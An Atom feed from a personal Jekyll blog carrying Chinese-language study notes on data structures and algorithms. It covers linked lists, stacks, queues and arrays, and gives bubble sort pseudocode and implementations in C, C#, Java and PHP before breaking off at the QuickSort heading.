<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-05-19T02:15:31+08:00</updated><id>http://localhost:4000/atom.xml</id><title type="html">Rengui’s Notes</title><subtitle>Life doesn't just happen to you; you receive everything in your life based on what you've given. 生命中的一切都不是巧合，你得到什么，是源于你付出了什么。</subtitle><author><name>Zhao Rengui</name></author><entry><title type="html">数据结构与算法</title><link href="http://localhost:4000/algorithms/2019/02/13/data-structure-algorithms/" rel="alternate" type="text/html" title="数据结构与算法" /><published>2019-02-13T00:00:00+08:00</published><updated>2019-02-13T00:00:00+08:00</updated><id>http://localhost:4000/algorithms/2019/02/13/data-structure-algorithms</id><content type="html" xml:base="http://localhost:4000/algorithms/2019/02/13/data-structure-algorithms/">&lt;div id=&quot;outline-container-orga7ca754&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orga7ca754&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 数据结构和算法目录&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
首先明确一点：程序=数据结构+算法

&lt;/pre&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 1:&lt;/span&gt; 数据结构和算法表&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;线性结构&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;树&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;堆&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;图&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;排序算法&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;数组、单链表和双链表&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;二叉查找树&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;二叉堆&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;图的理论基础&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;冒泡排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Linux内核中双向链表的经典实现&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;AVL树&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;左倾堆&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;无向图&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;快速排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;栈&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;伸展树&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;斜堆&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;有向图&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;插入排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;队列&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;红黑树&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;二项堆&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;深度优先搜索和广度优先搜索&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;希尔排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;哈夫曼树&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;斐波那契堆&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;拓扑排序&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;选择排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2026;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2026;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;Kruskal算法&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;堆排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;Prim算法&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;归并排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;Dijkstra算法&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;桶排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2026;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;基数排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#x2026;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org95651e4&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org95651e4&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 线性结构&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
常用的线性结构有：线性表，栈，队列，循环队列，数组。

&lt;/pre&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;线性表：是一种线性结构，它是具有相同类型的n(n≥0)个数据元素组成的有限序列。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;顺序表：是在计算机内存中以数组的形式保存的线性表，是指用一组地址连续的存储单元依次存储数据元素的线性结构。&lt;/li&gt;
&lt;li&gt;链表（Linked list）
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;单链表：它由节点组成，每个节点都包含下一个节点的指针。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;单链表分为：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;动态单链表&lt;/li&gt;
&lt;li&gt;静态单链表&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
单链表操作图示
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-01.jpg&quot; alt=&quot;linked-list-01.jpg&quot; /&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
表头为空，表头的后继节点是&quot;节点10&quot;，&quot;节点10&quot;的后继节点是&quot;节点20&quot;。

&lt;/pre&gt;
&lt;p&gt;
&lt;b&gt;删除节点&lt;/b&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-02.jpg&quot; alt=&quot;linked-list-02.jpg&quot; /&gt;
&lt;b&gt;添加节点&lt;/b&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-03.jpg&quot; alt=&quot;linked-list-03.jpg&quot; /&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;单链表的特点是：节点的链接方向是单向的；相对于数组来说，单链表的的随机访问速度较慢，但是单链表删除/添加数据的效率很高。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;双链表：它也是由节点组成，它的每个数据结点中都有两个指针，分别指向直接后继和直接前驱。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
双链表操作图示
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-04.jpg&quot; alt=&quot;linked-list-04.jpg&quot; /&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
表头为空，表头的后继节点为&quot;节点10&quot;(数据为10的节点)；&quot;节点10&quot;的后继节点是&quot;节点20&quot;(数据为10的节点)，&quot;节点20&quot;的前继节点是&quot;节点10&quot;；&quot;节点20&quot;的后继节点是&quot;节点30&quot;，&quot;节点30&quot;的前继节点是&quot;节点20&quot;；...；末尾节点的后继节点是表头。

&lt;/pre&gt;
&lt;p&gt;
&lt;b&gt;删除节点&lt;/b&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-05.jpg&quot; alt=&quot;linked-list-05.jpg&quot; /&gt;
&lt;b&gt;添加节点&lt;/b&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/linked-list-06.jpg&quot; alt=&quot;linked-list-06.jpg&quot; /&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;代码实现
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
Java
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-java&quot; id=&quot;org521a945&quot;&gt;&lt;span style=&quot;color: #8b2252;&quot;&gt;/**&lt;/span&gt;
&lt;span style=&quot;color: #8b2252;&quot;&gt; * Java &amp;#23454;&amp;#29616;&amp;#30340;&amp;#21452;&amp;#21521;&amp;#38142;&amp;#34920;&amp;#12290; &lt;/span&gt;
&lt;span style=&quot;color: #8b2252;&quot;&gt; * &amp;#27880;&amp;#65306;java&amp;#33258;&amp;#24102;&amp;#30340;&amp;#38598;&amp;#21512;&amp;#21253;&amp;#20013;&amp;#26377;&amp;#23454;&amp;#29616;&amp;#21452;&amp;#21521;&amp;#38142;&amp;#34920;&amp;#65292;&amp;#36335;&amp;#24452;&amp;#26159;:java.util.LinkedList&lt;/span&gt;
&lt;span style=&quot;color: #8b2252;&quot;&gt; */&lt;/span&gt;
&lt;span style=&quot;color: #a020f0;&quot;&gt;public&lt;/span&gt; &lt;span style=&quot;color: #a020f0;&quot;&gt;class&lt;/span&gt; &lt;span style=&quot;color: #228b22;&quot;&gt;DoubleLink&lt;/span&gt;&amp;lt;&lt;span style=&quot;color: #228b22;&quot;&gt;T&lt;/span&gt;&amp;gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;循环链表
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;单循环链表&lt;/li&gt;
&lt;li&gt;双循环链表&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;栈（stack）：是计算机科学中一种特殊的串列形式的抽象数据类型，按照后进先出（LIFO, Last In First Out）的原理运作。其特殊之处在于只能允许在链表或数组的一端（称为堆栈顶端指针，英语：top）进行加入数据（英语：push）和输出数据（英语：pop）的运算。&lt;/li&gt;
&lt;li&gt;队列：又称为伫列（queue），是先进先出（FIFO, First-In-First-Out）的线性表。队列只允许在后端（称为rear）进行插入操作，在前端（称为front）进行删除操作。&lt;/li&gt;
&lt;li&gt;数组：在计算机科学中，数组数据结构（英语：array data structure），简称数组（英语：Array），是由相同类型的元素（element）的集合所组成的数据结构，分配一块连续的内存来存储。
&lt;img src=&quot;http://localhost:4000/assets/images/array-data-structure-01.jpg&quot; alt=&quot;array-data-structure-01.jpg&quot; /&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;数组的特点是：数据的元素在上下界内是连续的；随机访问速度快。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf393b5e&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgf393b5e&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; 树&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org896303a&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org896303a&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.1&lt;/span&gt; 二叉树&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf28e2ea&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgf28e2ea&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.2&lt;/span&gt; AVL 树&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org4bef1ca&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org4bef1ca&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.3&lt;/span&gt; 伸展树&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2c99d63&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org2c99d63&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.4&lt;/span&gt; 红黑树&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3fef8bc&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org3fef8bc&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.5&lt;/span&gt; 哈夫曼树&lt;/h3&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3e45a3a&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org3e45a3a&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;4&lt;/span&gt; 堆&lt;/h2&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgcb0cff3&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgcb0cff3&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;5&lt;/span&gt; 图&lt;/h2&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org06b6f26&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org06b6f26&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;6&lt;/span&gt; 排序算法&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-6&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org24d84cb&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org24d84cb&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.1&lt;/span&gt; 冒泡排序(BubbleSort)&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb4cf362&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgb4cf362&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.1.1&lt;/span&gt; 介绍(Introduction)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-1-1&quot;&gt;
&lt;p&gt;
&lt;b&gt;en&lt;/b&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
Bubblesort is a popular,but inefficient,sorting algorithm. It works by repeatedly swapping adjacent elements that are out of order.

&lt;/pre&gt;
&lt;p&gt;
&lt;b&gt;cn&lt;/b&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
冒泡排序是一种较简单的排序算法。它会遍历若干次要排序的数列，每次遍历时，它都会从前往后依次的比较相邻两个数的大小；如果前者比后者大，
则交换它们的位置。这样，一次遍历之后，最大的元素就在数列的末尾！ 采用相同的方法再次遍历时，第二大的元素就被排列在最大元素之前。重复
此操作，直到整个数列都有序为止！

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orge824951&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orge824951&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.1.2&lt;/span&gt; 伪代码(pseudo code)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-1-2&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 1: &lt;/span&gt;pseudo code&lt;/label&gt;&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;for i = 1 to A.length - 1
    for j = A:length downto i + 1
        if A[j] &amp;lt; A[j-1]   
            exchange A[j] with A[j - 1]
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf9c0277&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgf9c0277&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.1.3&lt;/span&gt; 时间复杂度和稳定性&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-1-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
冒泡排序的时间复杂度是O(N2)。
假设被排序的数列中有N个数。遍历一趟的时间复杂度是O(N)，需要遍历多少次呢？N-1次！因此，冒泡排序的时间复杂度是O(N2)。

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
冒泡排序是稳定的算法，它满足稳定算法的定义。
算法稳定性 -- 假设在数列中存在a[i]=a[j]，若在排序之前，a[i]在a[j]前面；并且排序之后，a[i]仍然在a[j]前面。则这个排序算法是稳定的！

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1878d44&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org1878d44&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.1.4&lt;/span&gt; 实现(realization)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-1-4&quot;&gt;
&lt;p&gt;
&lt;b&gt;C&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 2: &lt;/span&gt;C&lt;/label&gt;&lt;pre class=&quot;src src-C&quot;&gt;&lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;i&lt;/span&gt;,&lt;span style=&quot;color: #a0522d;&quot;&gt;j&lt;/span&gt;;
&lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;flag&lt;/span&gt;; &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#26631;&amp;#35760;&lt;/span&gt;
&lt;span style=&quot;color: #a020f0;&quot;&gt;for&lt;/span&gt; (i=n-1; i&amp;gt;0; i--)
{
    flag = 0; &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#21021;&amp;#22987;&amp;#21270;&amp;#26631;&amp;#35760;&amp;#20026;0&lt;/span&gt;
    &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#23558;a[0...i]&amp;#20013;&amp;#26368;&amp;#22823;&amp;#30340;&amp;#25968;&amp;#25454;&amp;#25918;&amp;#22312;&amp;#26411;&amp;#23614;&lt;/span&gt;
    &lt;span style=&quot;color: #a020f0;&quot;&gt;for&lt;/span&gt; (j=0; j&amp;lt;i; j++)
    {
        &lt;span style=&quot;color: #a020f0;&quot;&gt;if&lt;/span&gt; (a[j] &amp;gt; a[j+1])
        {
            swap(a[j], a[j+1]);
            flag = 1;    &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#33509;&amp;#21457;&amp;#29983;&amp;#20132;&amp;#25442;&amp;#65292;&amp;#21017;&amp;#35774;&amp;#26631;&amp;#35760;&amp;#20026;1&lt;/span&gt;
        }
    }
    &lt;span style=&quot;color: #a020f0;&quot;&gt;if&lt;/span&gt; (flag==0)
        &lt;span style=&quot;color: #a020f0;&quot;&gt;break&lt;/span&gt;;&lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#33509;&amp;#27809;&amp;#21457;&amp;#29983;&amp;#20132;&amp;#25442;&amp;#65292;&amp;#21017;&amp;#35828;&amp;#26126;&amp;#25968;&amp;#21015;&amp;#24050;&amp;#26377;&amp;#24207;&amp;#12290;&lt;/span&gt;
} 
&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;
&lt;b&gt;C#&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 3: &lt;/span&gt;C#&lt;/label&gt;&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;//Core code.
for (int i = 0&lt;span style=&quot;color: #b22222;&quot;&gt;; &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;i &amp;lt; arrInt.Length - 1; i++)&lt;/span&gt;
{
    for (int j = 1&lt;span style=&quot;color: #b22222;&quot;&gt;; &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;j &amp;lt; arrInt.Length - i; j++)&lt;/span&gt;
    {
        if (arrInt[j] &amp;lt; arrInt[j - 1])
        {
            //&amp;#20132;&amp;#25442;&amp;#20540;
            int temp = arrInt[j]&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
            arrInt[j] = arrInt[j - 1]&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
            arrInt[j - 1] = temp&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
        }
    }
}
&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;
&lt;b&gt;Java&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 4: &lt;/span&gt;Java&lt;/label&gt;&lt;pre class=&quot;src src-java&quot;&gt;&lt;span style=&quot;color: #a020f0;&quot;&gt;public&lt;/span&gt; &lt;span style=&quot;color: #a020f0;&quot;&gt;static&lt;/span&gt; &lt;span style=&quot;color: #228b22;&quot;&gt;void&lt;/span&gt; &lt;span style=&quot;color: #0000ff;&quot;&gt;BubbleSort&lt;/span&gt;(&lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt;[] &lt;span style=&quot;color: #a0522d;&quot;&gt;arr&lt;/span&gt;,&lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;num&lt;/span&gt;) {
    &lt;span style=&quot;color: #a020f0;&quot;&gt;for&lt;/span&gt; (&lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;i&lt;/span&gt; = 0; i &amp;lt; arr.&lt;span style=&quot;color: #228b22;&quot;&gt;length&lt;/span&gt;; i++) {
            &lt;span style=&quot;color: #a020f0;&quot;&gt;for&lt;/span&gt; (&lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;j&lt;/span&gt; = num-1; j &amp;gt;i; j--) {
                    &lt;span style=&quot;color: #a020f0;&quot;&gt;if&lt;/span&gt; (arr[i]&amp;gt;arr[j]) {
                            &lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;temp&lt;/span&gt;=arr[i];
                            arr[i]=arr[j];
                            arr[j]=temp;
                    }
            }
    }
    &lt;span style=&quot;color: #a020f0;&quot;&gt;for&lt;/span&gt;(&lt;span style=&quot;color: #228b22;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;k&lt;/span&gt;=0;k&amp;lt;&lt;span style=&quot;color: #228b22;&quot;&gt;num&lt;/span&gt;;k++){
            System.out.print(arr[k]+&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot; &quot;&lt;/span&gt;);
    }
}
&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;
&lt;b&gt;PHP&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 5: &lt;/span&gt;PHP&lt;/label&gt;&lt;pre class=&quot;src src-shell&quot;&gt;&lt;span style=&quot;color: #a020f0;&quot;&gt;function&lt;/span&gt; &lt;span style=&quot;color: #0000ff;&quot;&gt;BubbleSort&lt;/span&gt;($&lt;span style=&quot;color: #a0522d;&quot;&gt;arr&lt;/span&gt;){
        &lt;span style=&quot;color: #a020f0;&quot;&gt;for&lt;/span&gt;($&lt;span style=&quot;color: #a0522d;&quot;&gt;i&lt;/span&gt;=0;$&lt;span style=&quot;color: #a0522d;&quot;&gt;i&lt;/span&gt;&amp;lt;count($&lt;span style=&quot;color: #a0522d;&quot;&gt;arr&lt;/span&gt;);$&lt;span style=&quot;color: #a0522d;&quot;&gt;i&lt;/span&gt;++){
                &lt;span style=&quot;color: #a020f0;&quot;&gt;for&lt;/span&gt;($&lt;span style=&quot;color: #a0522d;&quot;&gt;j&lt;/span&gt;=0;$&lt;span style=&quot;color: #a0522d;&quot;&gt;j&lt;/span&gt;&amp;lt;$&lt;span style=&quot;color: #a0522d;&quot;&gt;i&lt;/span&gt;;$&lt;span style=&quot;color: #a0522d;&quot;&gt;j&lt;/span&gt;++){
                        &lt;span style=&quot;color: #a020f0;&quot;&gt;if&lt;/span&gt;($&lt;span style=&quot;color: #a0522d;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #a0522d;&quot;&gt;i&lt;/span&gt;]&amp;gt;$&lt;span style=&quot;color: #a0522d;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #a0522d;&quot;&gt;j&lt;/span&gt;]){
                                $&lt;span style=&quot;color: #a0522d;&quot;&gt;temp&lt;/span&gt; = $&lt;span style=&quot;color: #a0522d;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #a0522d;&quot;&gt;i&lt;/span&gt;];
                                $&lt;span style=&quot;color: #a0522d;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #a0522d;&quot;&gt;i&lt;/span&gt;] = $&lt;span style=&quot;color: #a0522d;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #a0522d;&quot;&gt;j&lt;/span&gt;];
                                $&lt;span style=&quot;color: #a0522d;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #a0522d;&quot;&gt;j&lt;/span&gt;] = $&lt;span style=&quot;color: #a0522d;&quot;&gt;temp&lt;/span&gt;;
                        }
                }
        }
        foreach($&lt;span style=&quot;color: #a0522d;&quot;&gt;arr&lt;/span&gt; as $&lt;span style=&quot;color: #a0522d;&quot;&gt;value&lt;/span&gt;){
                &lt;span style=&quot;color: #483d8b;&quot;&gt;echo&lt;/span&gt; $&lt;span style=&quot;color: #a0522d;&quot;&gt;value&lt;/span&gt;.&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot; &quot;&lt;/span&gt;;
        }
}
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org949d5ee&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org949d5ee&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.2&lt;/span&gt; 快速排序(QuickSort)&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-2&quot;&gt;
